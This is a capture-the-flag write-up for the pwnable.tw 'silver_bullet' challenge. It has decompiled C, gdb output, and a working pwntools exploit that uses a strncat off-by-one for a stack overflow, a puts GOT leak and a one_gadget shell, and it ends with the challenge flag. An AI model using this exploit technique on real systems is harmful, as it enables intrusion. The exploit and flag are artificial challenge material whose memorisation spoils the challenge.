# silver bullet

```
[*] '/home/user/tw/silver_bullet'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

血量 2^31-1
- 新增子彈
    - 輸入子彈描述 長度限制 48
    - 攻擊是描述長度
    - 攻擊存offset 0x30
- 加強子彈
    - 攻擊 >0x2F 就無法增加攻擊
    - read_input 長度 48-當前子彈攻擊
    - strncat dest input size 當前子彈攻擊
- 攻擊怪物

strncat 會在最後放 \0，而當 dest 不夠長時，就會發生 buffer overflow，buffer 在 main 函數中

所以可以 overflow 到 bullet_len 這樣 bullet_len = 0

先塞入 47 個 A 再 powerup 加上一個 B，總長為 48，再次 powerup 又可以塞 48 bytes 

又可以在寫入 48 bytes 進去 控制 ret，beat 後 win 才會碰到 main leave ret，不過我們已經可以 overflow buffer 所以可以 win
```
00000000 struct_dest     struc ; (sizeof=0x34, align=0x4, mappedto_5)
00000000 char0           db ?
00000001 gap1            db 47 dup(?)
00000030 bullet_len      dd ?
00000034 struct_dest     ends
00000034
```

先 leak libc base addr



還有一個比較特別的是為了 puts 可以拿到要 print got 的位置，所以 payload 會長的比較特別 
- puts addr
- main addr //為了可以再次跳回main
- got addr

但是 48 bytes 好像沒有辦法太好利用，先找 gadget 
```
user@vm-ubuntu20:~/tw$ one_gadget libc_32.so.6 
0x3a819 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5f065 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5f066 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL
```

在 main ret 時
```
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
*EAX  0x0
*EBX  0xf7e2a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
*ECX  0xf7e2b9b4 (_IO_stdfile_1_lock) ◂— 0x0
*EDX  0x1
*EDI  0xf7ff6b80 (_rtld_global_ro) ◂— 0x0
*ESI  0xffa5f704 —▸ 0xffa613c1 ◂— './silver_bullet'
*EBP  0x804b02c ◂— 0x0
*ESP  0xffa5f650 ◂— 'P*++'
*EIP  0x8048a19 (main+197) ◂— ret 
───────────────────────[ DISASM / i386 / set emulate on ]───────────────────────
 ► 0x8048a19 <main+197>    ret    <0x2b2b2a50>

```


```c
int __cdecl create_bullet(char *s)
{
  size_t v2; // ST08_4

  if ( *s )
    return puts("You have been created the Bullet !");
  printf("Give me your description of bullet :");
  read_input(s, 0x30u);
  v2 = strlen(s);
  printf("Your power is : %u\n", v2);
  *((_DWORD *)s + 12) = v2;
  return puts("Good luck !!");
}

int __cdecl power_up(char *dest)
{
  char s; // [esp+0h] [ebp-34h]
  size_t v3; // [esp+30h] [ebp-4h]

  v3 = 0;
  memset(&s, 0, 0x30u);
  if ( !*dest )
    return puts("You need create the bullet first !");
  if ( *((_DWORD *)dest + 12) > 0x2Fu )
    return puts("You can't power up any more !");
  printf("Give me your another description of bullet :");
  read_input(&s, 48 - *((_DWORD *)dest + 12));
  strncat(dest, &s, 48 - *((_DWORD *)dest + 12));
  v3 = strlen(&s) + *((_DWORD *)dest + 12);
  printf("Your new power is : %u\n", v3);
  *((_DWORD *)dest + 12) = v3;
  return puts("Enjoy it !");
              
signed int __cdecl beat(int a1, _DWORD *a2)
{
  signed int result; // eax

  if ( *(_BYTE *)a1 )
  {
    puts(">----------- Werewolf -----------<");
    printf(" + NAME : %s\n", a2[1]);
    printf(" + HP : %d\n", *a2);
    puts(">--------------------------------<");
    puts("Try to beat it .....");
    usleep(0xF4240u);
    *a2 -= *(_DWORD *)(a1 + 48);
    if ( *a2 <= 0 )
    {
      puts("Oh ! You win !!");
      result = 1;
    }
    else
    {
      puts("Sorry ... It still alive !!");
      result = 0;
    }
  }
  else
  {
    puts("You need create the bullet first !");
    result = 0;
  }
  return result;
}

ssize_t __cdecl read_input(void *buf, size_t nbytes)
{
  ssize_t v3; // [esp+0h] [ebp-4h]

  v3 = read(0, buf, nbytes);
  if ( v3 <= 0 )
  {
    puts("read error");
    exit(1);
  }
  if ( *((_BYTE *)buf + v3 - 1) == '\n' )
    *((_BYTE *)buf + v3 - 1) = 0;
  return v3;
}
```

exploit
```python 
from pwn import *

# context(arch="amd64", os='linux', log_level='debug')

elf = ELF('./silver_bullet')
libc = ELF("./libc_32.so.6")

r = remote('chall.pwnable.tw', 10103)


def create(description):
    r.sendafter("choice", '1')
    r.sendafter("description of bullet", description)

def power_up(description):
    r.sendafter("choice", '2')
    r.sendafter("another description of bullet", description)

def beat():
    r.sendafter("choice", '3')

create("A"*47)
power_up("A")
#   char s; // [esp+8h] [ebp-34h] 52
# >>> 52-48 =4

# 
ebp=0x804b02c

power_up(
        b'\xff' * 3 + p32(ebp) +
         p32(elf.sym['puts']) + 
         p32(elf.sym['main']) + 
         p32(elf.got['puts'])
         )
beat()
r.recvuntil("Oh ! You win !!\n")
puts = u32(r.recv(4))


libc_base = puts - libc.sym['puts']
one = libc_base + 0x5f065

create("A"*47)
power_up("A")
power_up(b'\xff' * 3 + p32(ebp)+p32(one))
beat()

r.interactive()
```

>FLAG{uS1ng_S1lv3r_bu1l3t_7o_Pwn_th3_w0rld}
